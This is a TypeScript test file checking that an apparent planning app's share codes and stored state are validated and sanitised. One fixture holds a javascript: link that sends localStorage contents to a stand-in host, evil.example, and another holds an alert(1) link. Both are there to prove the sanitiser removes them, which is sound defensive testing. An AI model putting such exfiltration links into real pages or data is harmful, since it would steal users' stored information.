import LZString from "lz-string";
import { describe, expect, it } from "vitest";

import { applyShareCode, buildShareCode, parseShareCode } from "../share";
import { initialState, type AppState, type Place, type PlanEvent } from "../types";
import { validAppState } from "../validate";

/** Wrap an arbitrary object as if it were a genuine share code. */
function encode(payload: unknown): string {
  return "TN1:" + LZString.compressToEncodedURIComponent(JSON.stringify(payload));
}

const basePayload = {
  v: 1,
  from: "Alex",
  fromZone: "Europe/London",
  startDate: "2024-01-01",
  events: [],
  milestones: [],
  moods: [],
  places: [],
  expenses: [],
  goals: [],
  watch: [],
  at: Date.now(),
};

describe("parseShareCode", () => {
  it("round-trips a code this app built", () => {
    const state: AppState = {
      ...initialState(),
      me: { name: "Sam", timeZone: "America/New_York", handles: {} },
      startDate: "2023-06-01",
      events: [
        {
          id: "e1",
          title: "Call",
          date: "2030-02-02",
          time: "19:30",
          anchor: "me",
          owner: "me",
          updatedAt: 1_700_000_000_000,
        },
      ],
    };
    const parsed = parseShareCode(buildShareCode(state));
    expect(parsed.from).toBe("Sam");
    expect(parsed.fromZone).toBe("America/New_York");
    expect(parsed.events).toHaveLength(1);
    expect(parsed.events[0]?.title).toBe("Call");
  });

  it("strips a javascript: link out of a shared place", () => {
    const parsed = parseShareCode(
      encode({
        ...basePayload,
        places: [
          {
            id: "p1",
            name: "Nice bar",
            url: "javascript:fetch('https://evil.example/'+localStorage.getItem('together-now:v1'))",
            owner: "me",
            source: "manual",
            visited: false,
            updatedAt: 1,
          },
        ],
      }),
    );
    expect(parsed.places).toHaveLength(1);
    expect(parsed.places[0]?.url).toBeUndefined();
  });

  it("drops items whose fields fall outside their declared unions", () => {
    const parsed = parseShareCode(
      encode({
        ...basePayload,
        events: [
          { id: "ok", title: "Fine", date: "2030-01-01", owner: "us", updatedAt: 1 },
          { id: "bad-date", title: "Nope", date: "2030-02-31", owner: "us", updatedAt: 1 },
          { id: "no-date", title: "Nope", owner: "us", updatedAt: 1 },
          { title: "No id", date: "2030-01-01", owner: "us", updatedAt: 1 },
        ],
        moods: [
          { id: "m1", date: "2030-01-01", score: 4, owner: "me", updatedAt: 1 },
          { id: "m2", date: "2030-01-01", score: 99, owner: "me", updatedAt: 1 },
        ],
      }),
    );
    expect(parsed.events.map((e) => e.id)).toEqual(["ok"]);
    expect(parsed.moods.map((m) => m.id)).toEqual(["m1"]);
  });

  it("clamps a future updatedAt so an item cannot pin itself forever", () => {
    const parsed = parseShareCode(
      encode({
        ...basePayload,
        events: [
          {
            id: "e1",
            title: "Pinned",
            date: "2030-01-01",
            owner: "us",
            updatedAt: Number.MAX_SAFE_INTEGER,
          },
        ],
      }),
    );
    expect(parsed.events[0]?.updatedAt).toBeLessThan(Date.now() + 2 * 24 * 60 * 60 * 1000);
  });

  it("caps how much a single code can carry", () => {
    const events = Array.from({ length: 5_000 }, (_, i) => ({
      id: `e${i}`,
      title: "x",
      date: "2030-01-01",
      owner: "us",
      updatedAt: 1,
    }));
    const parsed = parseShareCode(encode({ ...basePayload, events }));
    expect(parsed.events.length).toBeLessThanOrEqual(2_000);
  });

  it("rejects garbage rather than throwing something unhandled", () => {
    expect(() => parseShareCode("")).toThrow();
    expect(() => parseShareCode("TN1:not-really-compressed")).toThrow();
    expect(() => parseShareCode(encode({ v: 2 }))).toThrow();
    expect(() => parseShareCode(encode({ v: 1 }))).toThrow();
  });
});

describe("applyShareCode", () => {
  const mine: PlanEvent = {
    id: "shared-id",
    title: "My private plan",
    date: "2030-03-03",
    anchor: "me",
    owner: "me",
    updatedAt: 1_000,
  };

  it("never lets an incoming item overwrite one the device owns", () => {
    const state: AppState = { ...initialState(), events: [mine] };
    const payload = parseShareCode(
      encode({
        ...basePayload,
        events: [
          {
            id: "shared-id",
            title: "Replaced by partner",
            date: "2030-03-03",
            anchor: "me",
            owner: "us",
            updatedAt: 2_000,
          },
        ],
      }),
    );
    const { state: merged } = applyShareCode(state, payload);
    expect(merged.events.find((e) => e.id === "shared-id")?.title).toBe("My private plan");
  });

  it("still merges newer versions of jointly-owned items", () => {
    const ours: PlanEvent = { ...mine, owner: "us", title: "Ours, old" };
    const state: AppState = { ...initialState(), events: [ours] };
    const payload = parseShareCode(
      encode({
        ...basePayload,
        events: [
          {
            id: "shared-id",
            title: "Ours, new",
            date: "2030-03-03",
            anchor: "me",
            owner: "us",
            updatedAt: 2_000,
          },
        ],
      }),
    );
    const { state: merged, summary } = applyShareCode(state, payload);
    expect(merged.events.find((e) => e.id === "shared-id")?.title).toBe("Ours, new");
    expect(summary.updated).toBe(1);
  });
});

describe("validAppState", () => {
  it("falls back to a fresh archive for anything unrecognisable", () => {
    expect(validAppState(null).version).toBe(1);
    expect(validAppState("nope").events).toEqual([]);
    expect(validAppState({ version: 99 }).events).toEqual([]);
  });

  it("keeps the good records and discards the bad ones", () => {
    const restored = validAppState({
      ...initialState(),
      version: 1,
      theme: "midnight",
      reminderHour: 999,
      events: [
        { id: "good", title: "Yes", date: "2030-01-01", owner: "us", updatedAt: 1 },
        { id: "bad", title: "No", date: "not-a-date", owner: "us", updatedAt: 1 },
      ],
    });
    expect(restored.theme).toBe("light");
    expect(restored.reminderHour).toBe(9);
    expect(restored.events.map((e) => e.id)).toEqual(["good"]);
  });

  it("scrubs a hostile link that reached storage before the allowlist existed", () => {
    const place: Partial<Place> = {
      id: "p1",
      name: "Cafe",
      url: "javascript:alert(1)",
      owner: "us",
      source: "manual",
      visited: false,
      updatedAt: 1,
    };
    const restored = validAppState({ ...initialState(), version: 1, places: [place] });
    expect(restored.places[0]?.url).toBeUndefined();
  });

  it("drops duplicate ids so the merge key stays unique", () => {
    const event = { id: "dup", title: "A", date: "2030-01-01", owner: "us", updatedAt: 1 };
    const restored = validAppState({
      ...initialState(),
      version: 1,
      events: [event, { ...event, title: "B" }],
    });
    expect(restored.events).toHaveLength(1);
  });
});
